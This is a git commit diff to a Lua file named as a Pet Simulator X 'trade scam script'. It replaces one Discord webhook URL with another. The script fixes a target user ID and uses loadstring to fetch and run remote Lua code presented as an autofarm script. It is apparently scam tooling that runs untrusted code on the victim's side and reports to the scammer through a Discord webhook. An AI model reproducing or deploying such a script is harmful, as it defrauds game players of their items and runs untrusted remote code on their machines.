380fb9ba9b4f46f1ce08035be72114acc82f4433
SanctionedShinobi <98543352+SanctionedShinobi@users.noreply.github.com>
2023-01-23 17:19:29 -0500

    Update pet sim x trade scam script 2.lua

--- pet sim x trade scam script 2.lua
+++ pet sim x trade scam script 2.lua
@@ -1,3 +1,3 @@
 _G.UserID = 3552352482
-_G.WebHook = "https://discord.com/api/webhooks/1067185506821091328/nD3KSJ7r1GMpvxi79U_9m4du_5jfK98sST9l-8M4uEQX0l5wjDwOHyHGaCHA3mrveial"
+_G.WebHook = "https://discord.com/api/webhooks/1067206903043739769/ov5QWKeBE9IWjgJNXJNR5_d6jixlRfjsdzhR4jeKH1YlQYbQKpIO62YWT6c4Rnq7u00J"
 loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
